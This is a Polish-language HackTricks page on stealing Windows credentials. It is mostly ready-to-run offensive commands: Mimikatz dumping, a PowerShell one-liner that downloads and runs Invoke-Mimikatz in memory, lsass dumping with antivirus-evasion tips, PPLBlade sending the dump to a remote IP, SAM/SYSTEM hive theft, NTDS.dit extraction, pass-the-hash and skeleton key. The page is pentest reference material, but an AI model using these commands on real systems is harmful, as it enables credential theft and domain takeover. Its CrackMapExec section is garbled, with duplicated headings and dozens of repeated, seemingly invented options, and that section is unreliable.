# Kradzież poświadczeń Windows

<details>

<summary><strong>Naucz się hackingu AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF** Sprawdź [**PLANY SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się więcej o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyciągnięcie niektórych poświadczeń.**

## Poświadczenia z Meterpreter

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **który stworzyłem, aby** **wyszukiwać hasła i hashe** wewnątrz ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoft**, nie jest wykrywany przez Defendera.\
Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wyodrębnienia** **poświadczeń lokalnie** ze zrzutu.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **bardziej ukryte** jest **przekazanie** jako **argument** **PID** lsass.exe do procdump **zamiast** **nazwy lsass.exe.**

### Zrzucanie lsass za pomocą **comsvcs.dll**

DLL o nazwie **comsvcs.dll** znajdujący się w `C:\Windows\System32` jest odpowiedzialny za **zrzucanie pamięci procesu** w przypadku awarii. Ta DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywoływania za pomocą `rundll32.exe`.\
Pierwsze dwa argumenty są nieistotne, ale trzeci jest podzielony na trzy komponenty. Pierwszy komponent to ID procesu do zrzutu, drugi to lokalizacja pliku zrzutu, a trzeci komponent to ściśle słowo **full**. Nie ma innych opcji.\
Po przeanalizowaniu tych trzech komponentów, DLL angażuje się w tworzenie pliku zrzutu i przenoszenie pamięci określonego procesu do tego pliku.\
Wykorzystanie **comsvcs.dll** jest możliwe do zrzucania procesu lsass, eliminując potrzebę przesyłania i uruchamiania procdump. Ta metoda jest szczegółowo opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Do wykonania używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Możesz zautomatyzować ten proces za pomocą** [**lsassy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy na Pasek zadań i wybierz Menedżer zadań
2. Kliknij na Więcej szczegółów
3. Wyszukaj proces "Local Security Authority Process" na karcie Procesy
4. Kliknij prawym przyciskiem myszy na proces "Local Security Authority Process" i wybierz "Utwórz plik zrzutu".

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, który jest częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzutu chronionych procesów, które obsługuje zaciemnianie zrzutu pamięci i przesyłanie go na zdalne stacje robocze bez zapisywania na dysku.

**Kluczowe funkcjonalności**:

1. Omijanie ochrony PPL
2. Zaciemnianie plików zrzutu pamięci w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach Defendera
3. Przesyłanie zrzutu pamięci metodami RAW i SMB bez zapisywania na dysku (zrzut bezplikowy)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

### Zrzut haseł SAM

```bash
cme smb <target_ip> -u <username> -p <password> --sam
```

### Dump LSA Secrets

### Zrzut LSA Secrets

```bash
cme smb <target_ip> -u <username> -p <password> --lsa
```

### Dump NTDS.dit

### Zrzut NTDS.dit

```bash
cme smb <target_ip> -u <username> -p <password> --ntds
```

### Pass-the-Hash

### Pass-the-Hash

```bash
cme smb <target_ip> -u <username> -H <hash>
```

### Pass-the-Ticket

### Pass-the-Ticket

```bash
cme smb <target_ip> -k -no-pass
```

### Over-Pass-the-Hash (Pass-the-Key)

### Over-Pass-the-Hash (Pass-the-Key)

```bash
cme smb <target_ip> -u <username> -p <password> -H <hash>
```

### Pass-the-Cache

### Pass-the-Cache

```bash
cme smb <target_ip> -u <username> -p <password> --ptc
```

### Enumerate shares

### Enumeracja udziałów

```bash
cme smb <target_ip> -u <username> -p <password> --shares
```

### Enumerate sessions

### Enumeracja sesji

```bash
cme smb <target_ip> -u <username> -p <password> --sessions
```

### Enumerate users

### Enumeracja użytkowników

```bash
cme smb <target_ip> -u <username> -p <password> --users
```

### Enumerate groups

### Enumeracja grup

```bash
cme smb <target_ip> -u <username> -p <password> --groups
```

### Enumerate logged on users

### Enumeracja zalogowanych użytkowników

```bash
cme smb <target_ip> -u <username> -p <password> --loggedon
```

### Enumerate local admins

### Enumeracja lokalnych administratorów

```bash
cme smb <target_ip> -u <username> -p <password> --local-admins
```

### Enumerate domain admins

### Enumeracja administratorów domeny

```bash
cme smb <target_ip> -u <username> -p <password> --domain-admins
```

### Enumerate password policy

### Enumeracja polityki haseł

```bash
cme smb <target_ip> -u <username> -p <password> --pass-pol
```

### Enumerate LAPS passwords

### Enumeracja haseł LAPS

```bash
cme smb <target_ip> -u <username> -p <password> --laps
```

### Enumerate GPP passwords

### Enumeracja haseł GPP

```bash
cme smb <target_ip> -u <username> -p <password> --gpp
```

### Enumerate SMB signing

### Enumeracja podpisywania SMB

```bash
cme smb <target_ip> -u <username> -p <password> --signing
```

### Enumerate SMB version

### Enumeracja wersji SMB

```bash
cme smb <target_ip> -u <username> -p <password> --smbv
```

### Enumerate SMB dialects

### Enumeracja dialektów SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dialects
```

### Enumerate SMB security mode

### Enumeracja trybu bezpieczeństwa SMB

```bash
cme smb <target_ip> -u <username> -p <password> --sec-mode
```

### Enumerate SMB capabilities

### Enumeracja możliwości SMB

```bash
cme smb <target_ip> -u <username> -p <password> --capabilities
```

### Enumerate SMB OS

### Enumeracja systemu operacyjnego SMB

```bash
cme smb <target_ip> -u <username> -p <password> --os
```

### Enumerate SMB domain

### Enumeracja domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --domain
```

### Enumerate SMB FQDN

### Enumeracja FQDN SMB

```bash
cme smb <target_ip> -u <username> -p <password> --fqdn
```

### Enumerate SMB NetBIOS

### Enumeracja NetBIOS SMB

```bash
cme smb <target_ip> -u <username> -p <password> --netbios
```

### Enumerate SMB DNS

### Enumeracja DNS SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dns
```

### Enumerate SMB domain SID

### Enumeracja SID domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --domain-sid
```

### Enumerate SMB domain SID history

### Enumeracja historii SID domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --sid-history
```

### Enumerate SMB domain trusts

### Enumeracja zaufania domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --trusts
```

### Enumerate SMB domain controllers

### Enumeracja kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs
```

### Enumerate SMB domain controllers FQDN

### Enumeracja FQDN kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
```

### Enumerate SMB domain controllers NetBIOS

### Enumeracja NetBIOS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-netbios
```

### Enumerate SMB domain controllers DNS

### Enumeracja DNS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-dns
```

### Enumerate SMB domain controllers SID

### Enumeracja SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid
```

### Enumerate SMB domain controllers SID history

### Enumeracja historii SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
```

### Enumerate SMB domain controllers trusts

### Enumeracja zaufania kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-trusts
```

### Enumerate SMB domain controllers capabilities

### Enumeracja możliwości kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
```

### Enumerate SMB domain controllers OS

### Enumeracja systemu operacyjnego kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-os
```

### Enumerate SMB domain controllers domain

### Enumeracja domeny kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-domain
```

### Enumerate SMB domain controllers FQDN

### Enumeracja FQDN kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
```

### Enumerate SMB domain controllers NetBIOS

### Enumeracja NetBIOS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-netbios
```

### Enumerate SMB domain controllers DNS

### Enumeracja DNS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-dns
```

### Enumerate SMB domain controllers SID

### Enumeracja SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid
```

### Enumerate SMB domain controllers SID history

### Enumeracja historii SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
```

### Enumerate SMB domain controllers trusts

### Enumeracja zaufania kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-trusts
```

### Enumerate SMB domain controllers capabilities

### Enumeracja możliwości kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
```

### Enumerate SMB domain controllers OS

### Enumeracja systemu operacyjnego kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-os
```

### Enumerate SMB domain controllers domain

### Enumeracja domeny kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-domain
```

### Enumerate SMB domain controllers FQDN

### Enumeracja FQDN kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
```

### Enumerate SMB domain controllers NetBIOS

### Enumeracja NetBIOS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-netbios
```

### Enumerate SMB domain controllers DNS

### Enumeracja DNS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-dns
```

### Enumerate SMB domain controllers SID

### Enumeracja SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid
```

### Enumerate SMB domain controllers SID history

### Enumeracja historii SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
```

### Enumerate SMB domain controllers trusts

### Enumeracja zaufania kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-trusts
```

### Enumerate SMB domain controllers capabilities

### Enumeracja możliwości kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
```

### Enumerate SMB domain controllers OS

### Enumeracja systemu operacyjnego kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-os
```

### Enumerate SMB domain controllers domain

### Enumeracja domeny kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-domain
```

### Enumerate SMB domain controllers FQDN

### Enumeracja FQDN kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
```

### Enumerate SMB domain controllers NetBIOS

### Enumeracja NetBIOS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-netbios
```

### Enumerate SMB domain controllers DNS

### Enumeracja DNS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-dns
```

### Enumerate SMB domain controllers SID

### Enumeracja SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid
```

### Enumerate SMB domain controllers SID history

### Enumeracja historii SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
```

### Enumerate SMB domain controllers trusts

### Enumeracja zaufania kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-trusts
```

### Enumerate SMB domain controllers capabilities

### Enumeracja możliwości kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
```

### Enumerate SMB domain controllers OS

### Enumeracja systemu operacyjnego kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-os
```

### Enumerate SMB domain controllers domain

### Enumeracja domeny kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-domain
```

### Enumerate SMB domain controllers FQDN

### Enumeracja FQDN kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
```

### Enumerate SMB domain controllers NetBIOS

### Enumeracja NetBIOS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-netbios
```

### Enumerate SMB domain controllers DNS

### Enumeracja DNS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-dns
```

### Enumerate SMB domain controllers SID

### Enumeracja SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid
```

### Enumerate SMB domain controllers SID history

### Enumeracja historii SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
```

### Enumerate SMB domain controllers trusts

### Enumeracja zaufania kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-trusts
```

### Enumerate SMB domain controllers capabilities

### Enumeracja możliwości kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
```

### Enumerate SMB domain controllers OS

### Enumeracja systemu operacyjnego kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-os
```

### Enumerate SMB domain controllers domain

### Enumeracja domeny kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-domain
```

### Enumerate SMB domain controllers FQDN

### Enumeracja FQDN kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
```

### Enumerate SMB domain controllers NetBIOS

### Enumeracja NetBIOS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-netbios
```

### Enumerate SMB domain controllers DNS

### Enumeracja DNS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-dns
```

### Enumerate SMB domain controllers SID

### Enumeracja SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid
```

### Enumerate SMB domain controllers SID history

### Enumeracja historii SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid-history
```

### Enumerate SMB domain controllers trusts

### Enumeracja zaufania kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-trusts
```

### Enumerate SMB domain controllers capabilities

### Enumeracja możliwości kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-capabilities
```

### Enumerate SMB domain controllers OS

### Enumeracja systemu operacyjnego kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-os
```

### Enumerate SMB domain controllers domain

### Enumeracja domeny kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-domain
```

### Enumerate SMB domain controllers FQDN

### Enumeracja FQDN kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-fqdn
```

### Enumerate SMB domain controllers NetBIOS

### Enumeracja NetBIOS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-netbios
```

### Enumerate SMB domain controllers DNS

### Enumeracja DNS kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-dns
```

### Enumerate SMB domain controllers SID

### Enumeracja SID kontrolerów domeny SMB

```bash
cme smb <target_ip> -u <username> -p <password> --dcs-sid
```

### Enumerate SMB domain controllers SID
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Zrzut LSA secrets

LSA (Local Security Authority) przechowuje różne poufne dane, takie jak hasła użytkowników, klucze szyfrowania i inne tajne informacje. Można je zrzucić za pomocą `mimikatz`.

```shell
mimikatz # sekurlsa::logonpasswords
```

### Dump SAM database

SAM (Security Account Manager) przechowuje hasła lokalnych kont użytkowników. Można je zrzucić za pomocą `reg` i `mimikatz`.

```shell
reg save hklm\sam sam
reg save hklm\system system
mimikatz # lsadump::sam /system:system /sam:sam
```

### Dump NTDS.dit

NTDS.dit to baza danych Active Directory, która przechowuje hasła wszystkich użytkowników w domenie. Można ją zrzucić za pomocą `ntdsutil` i `mimikatz`.

```shell
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
copy c:\temp\Active Directory\ntds.dit .
copy c:\temp\registry\SYSTEM .
mimikatz # lsadump::dcsync /user:Administrator
```

### Pass-the-Hash

Pass-the-Hash to technika, która pozwala na uwierzytelnienie się jako użytkownik bez znajomości jego hasła, używając jedynie wartości hash NTLM.

```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe
```

### Pass-the-Ticket

Pass-the-Ticket to technika, która pozwala na uwierzytelnienie się jako użytkownik, używając biletów Kerberos.

```shell
mimikatz # kerberos::ptt <ticket.kirbi>
```

### Over-Pass-the-Hash (Pass-the-Key)

Over-Pass-the-Hash to technika, która pozwala na uwierzytelnienie się jako użytkownik, używając klucza Kerberos.

```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:example.com /aes256:<key> /run:cmd.exe
```

### Kerberoasting

Kerberoasting to technika, która pozwala na uzyskanie hashy haseł kont usługowych z biletów Kerberos.

```shell
mimikatz # kerberos::list /export
```

### DCSync

DCSync to technika, która pozwala na symulowanie zachowania kontrolera domeny w celu uzyskania hashy haseł użytkowników.

```shell
mimikatz # lsadump::dcsync /user:Administrator
```

### Skeleton Key

Skeleton Key to technika, która pozwala na wstrzyknięcie uniwersalnego hasła do kontrolera domeny, umożliwiając uwierzytelnienie się jako dowolny użytkownik.

```shell
mimikatz # misc::skeleton
```

### Mimikatz

Mimikatz to narzędzie do uzyskiwania haseł, hashy, biletów i kluczy z pamięci systemu Windows.

```shell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzut NTDS.dit z docelowego DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł NTDS.dit z docelowego DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Te pliki powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ale **nie możesz ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z Rejestru

Najłatwiejszym sposobem na kradzież tych plików jest uzyskanie kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** używając:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Możesz wykonać kopię chronionych plików za pomocą tej usługi. Musisz być Administratorem.

#### Używając vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz zrobić to samo z **Powershell**. To jest przykład **jak skopiować plik SAM** (używany dysk twardy to "C:" i jest zapisywany do C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na koniec, możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) do wykonania kopii SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory**, zawierając kluczowe dane o obiektach użytkowników, grupach i ich członkostwach. To tutaj przechowywane są **hasze haseł** użytkowników domeny. Ten plik to baza danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Data Table**: Ta tabela jest odpowiedzialna za przechowywanie szczegółów dotyczących obiektów, takich jak użytkownicy i grupy.
- **Link Table**: Śledzi relacje, takie jak członkostwa w grupach.
- **SD Table**: **Deskryptory zabezpieczeń** dla każdego obiektu są przechowywane tutaj, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Więcej informacji na ten temat: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on używany przez _lsass.exe_. Wtedy, **część** pliku **NTDS.dit** może być zlokalizowana **wewnątrz pamięci `lsass`** (można znaleźć najnowsze dostępne dane prawdopodobnie ze względu na poprawę wydajności poprzez użycie **cache**).

#### Odszyfrowywanie haszy wewnątrz NTDS.dit

Hasz jest zaszyfrowany 3 razy:

1. Odszyfruj Klucz Szyfrowania Hasła (**PEK**) używając **BOOTKEY** i **RC4**.
2. Odszyfruj **hasz** używając **PEK** i **RC4**.
3. Odszyfruj **hasz** używając **DES**.

**PEK** ma **taką samą wartość** na **każdym kontrolerze domeny**, ale jest **zaszyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** z **pliku SYSTEM kontrolera domeny (jest różny między kontrolerami domeny)**. Dlatego, aby uzyskać dane uwierzytelniające z pliku NTDS.dit **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiowanie NTDS.dit używając Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz również użyć triku [**volume shadow copy**](./#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii **SYSTEM file** (ponownie, [**zrzucić go z rejestru lub użyć triku volume shadow copy**](./#stealing-sam-and-system)).

### **Wyodrębnianie hashy z NTDS.dit**

Gdy już **zdobędziesz** pliki **NTDS.dit** i **SYSTEM**, możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz również **wyodrębnić je automatycznie** używając ważnego użytkownika z uprawnieniami administratora domeny:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się wyodrębnienie ich za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na koniec, możesz również użyć **modułu metasploit**: _post/windows/gather/credentials/domain\_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS mogą być wyodrębnione do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie tylko sekrety są wyodrębniane, ale także całe obiekty i ich atrybuty dla dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit jest już pobrany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hashe NT i LM, dodatkowe poświadczenia takie jak hasła w postaci jawnej, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typami zaufania, kierunkiem i atrybutami...

## Lazagne

Pobierz plik binarny z [tutaj](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębniania poświadczeń z kilku programów.
```
lazagne.exe all
```
## Inne narzędzia do wyciągania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może być używane do wyciągania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyciąga poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

